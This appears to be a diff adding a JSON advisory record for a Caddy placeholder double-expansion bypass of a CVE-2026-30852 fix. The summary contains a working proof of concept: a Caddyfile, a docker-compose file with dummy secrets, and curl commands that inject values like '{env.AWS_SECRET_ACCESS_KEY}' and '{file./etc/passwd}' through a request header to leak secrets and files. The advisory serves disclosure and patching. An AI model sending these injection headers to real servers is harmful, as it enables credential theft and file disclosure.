@@ -1,0 +1,54 @@
+{
+  "id": "GHSA-wwhq-w58m-w29c",
+  "aliases": [],
+  "title": "Caddy CVE-2026-30852 Fix Bypass",
+  "summary": "# \r\n\r\n## TL;DR\r\n\r\nCVE-2026-30852 fixed double expansion in `vars_regexp` when the variable key is a placeholder (e.g. `{http.vars.x}`). The fix does NOT protect literal key names (e.g. `tenant_id`). An attacker injects `{env.AWS_SECRET_ACCESS_KEY}` or `{file./etc/passwd}` via a request header → Caddy expands it on the second pass → secrets leaked in response headers.\r\n\r\n**Affected:** Caddy v2.11.0 through v2.11.2 (latest). All versions since the CVE-2026-30852 fix.\r\n\r\n## Root Cause\r\n\r\n`modules/caddyhttp/vars.go`, lines 215-217:\r\n\r\n```go\r\nvalExpanded = varStr\r\nif !fromPlaceholder {\r\n    valExpanded = repl.ReplaceAll(varStr, \"\")  // ← SECOND EXPANSION\r\n}\r\n```\r\n\r\nSame issue at line 358-360 in `MatchVarsRE`.\r\n\r\n`fromPlaceholder` is `false` when the variable key is a literal string (not wrapped in `{}`). The fix only protects `fromPlaceholder=true`.\r\n\r\n### Expansion chain:\r\n\r\n1. Config: `vars tenant_id {http.request.header.X-Tenant-ID}`\r\n2. Request header: `X-Tenant-ID: {env.SECRET}`\r\n3. **Pass 1** (`VarsMiddleware.ServeHTTP`, line 63): `repl.ReplaceAll(\"{http.request.header.X-Tenant-ID}\", \"\")` → resolves to literal string `{env.SECRET}`. Stored in vars map.\r\n4. **Pass 2** (`VarsMatcher.MatchWithError`, line 217): `repl.ReplaceAll(\"{env.SECRET}\", \"\")` → resolves to the actual secret value.\r\n5. Leaked value reflected in response header `X-Tenant-ID` or forwarded to backend via `reverse_proxy`.\r\n\r\n## Impact\r\n\r\n- **Environment variable disclosure:** `{env.AWS_SECRET_ACCESS_KEY}`, `{env.DATABASE_URL}`, etc.\r\n- **Arbitrary file read (up to 1MB):** `{file./etc/passwd}`, `{file./proc/self/environ}`\r\n- **System info:** `{system.hostname}`, `{system.os}`\r\n- **Full env dump in one request:** `{file./proc/self/environ}`\r\n\r\n## Realistic Attack Scenario\r\n\r\nAPI gateway pattern - Caddy captures a tenant ID header, validates it with `vars_regexp`, and reflects it in response headers or forwards to a backend. This is a common production pattern for multi-tenant routing.\r\n\r\n```\r\n# Caddyfile\r\n:8080 {\r\n    vars tenant_id {http.request.header.X-Tenant-ID}\r\n    @has_tenant vars_regexp tenant tenant_id (.+)\r\n    handle @has_tenant {\r\n        header X-Tenant-ID \"{re.tenant.1}\"\r\n        reverse_proxy tenant-backend:8080\r\n    }\r\n    respond \"Missing X-Tenant-ID header\" 400\r\n}\r\n```\r\n\r\n```\r\n# docker-compose.yml\r\nservices:\r\n  caddy:\r\n    image: caddy:2.11.2\r\n    ports:\r\n      - \"8080:8080\"\r\n    volumes:\r\n      - ./Caddyfile:/etc/caddy/Caddyfile:ro\r\n    environment:\r\n      - SECRET_API_KEY=sk-SUPER-SECRET-KEY-12345\r\n      - DATABASE_URL=postgresql://admin:p4ssw0rd@db.internal:5432/production\r\n      - AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\r\n      - INTERNAL_TOKEN=eyJhbGciOiJIUzI1NiJ9.INTERNAL_ONLY\r\n```\r\n\r\nAttacker sends: `X-Tenant-ID: {env.AWS_SECRET_ACCESS_KEY}`\r\nResponse contains: `X-Tenant-ID: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`\r\n\r\n## Reproduce\r\n\r\n```bash\r\ndocker compose up -d\r\nsleep 2\r\n\r\n# Normal request - works as expected\r\ncurl -sI -H \"X-Tenant-ID: acme-corp\" http://localhost:8080/ | grep X-Tenant\r\n# X-Tenant-Id: acme-corp\r\n\r\n# Leak env var via response header\r\ncurl -sI -H \"X-Tenant-ID: {env.SECRET_API_KEY}\" http://localhost:8080/ | grep X-Tenant\r\n# X-Tenant-Id: sk-SUPER-SECRET-KEY-12345\r\n\r\n# Leak AWS credentials\r\ncurl -sI -H \"X-Tenant-ID: {env.AWS_SECRET_ACCESS_KEY}\" http://localhost:8080/ | grep X-Tenant\r\n# X-Tenant-Id: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\r\n\r\n# Read arbitrary file\r\ncurl -sI -H \"X-Tenant-ID: {file./etc/passwd}\" http://localhost:8080/ | grep X-Tenant\r\n\r\n# Dump ALL env vars (Linux)\r\ncurl -s -H \"X-Tenant-ID: {file./proc/self/environ}\" http://localhost:8080/\r\n```\r\n\r\n## Confirmed Test Output (Caddy v2.11.2)\r\n\r\n```\r\n$ curl -sI -H \"X-Tenant-ID: acme-corp\" http://localhost:8080/ | grep -i x-tenant\r\nX-Tenant-Id: acme-corp\r\nX-Routed-To: tenant-acme-corp\r\n\r\n$ curl -sI -H \"X-Tenant-ID: {env.SECRET_API_KEY}\" http://localhost:8080/ | grep -i x-tenant\r\nX-Tenant-Id: sk-SUPER-SECRET-KEY-12345\r\nX-Routed-To: tenant-sk-SU...",
+  "published_at": "2026-05-13T14:39:55.000Z",
+  "modified_at": "2026-05-19T19:35:48.000Z",
+  "severity": {
+    "level": "high",
+    "score": null,
+    "vector": null,
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-917"
+  ],
+  "affected": [
+    {
+      "product": "caddy",
+      "ranges": [
+        {
+          "introduced": "0",
+          "last_affected": "2.11.2"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-wwhq-w58m-w29c",
+      "type": "advisory"
+    },
+    {
+      "url": "https://github.com/advisories/GHSA-wwhq-w58m-w29c",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-wwhq-w58m-w29c",
+      "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-wwhq-w58m-w29c",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:9b7723808f00aecadf27813e4ef6506b2cec928f675cb48103f0e939bf42e437",
+  "note": null
+}
